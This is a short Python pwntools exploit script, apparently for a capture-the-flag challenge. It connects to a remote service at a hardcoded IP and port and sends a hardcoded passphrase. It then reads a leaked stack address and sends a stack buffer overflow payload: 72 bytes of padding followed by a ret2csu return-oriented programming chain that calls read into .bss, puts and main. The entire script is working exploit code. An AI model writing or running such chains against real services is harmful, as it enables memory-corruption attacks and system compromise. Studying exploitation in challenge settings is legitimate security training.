#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
got_read = 0x403250
bss_rw = 0x404040

# Test: CSU read(0, bss, 0x20) + puts(bss) + main (as stage 1)
payload = b'A' * 72
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(0) + p64(bss_rw) + p64(0x20) + p64(got_read)
payload += p64(csu_call)
payload += p64(0) + p64(0)*6
payload += p64(pop_rdi) + p64(bss_rw)
payload += p64(0x401040)     # puts
payload += p64(0x401393)     # main
print(f'Payload: {len(payload)}B')
r.send(payload)

import time
time.sleep(0.3)
r.send(b'STAGE1_TEST\n')

try:
    data = r.recv(timeout=5)
    print(f'Data ({len(data)}B): {data[:400]}')
    if b'STAGE1_TEST' in data and b'Spooktober' in data:
        print('CSU read works in stage 1!')
except Exception as e:
    print(f'Error: {e}')
r.close()
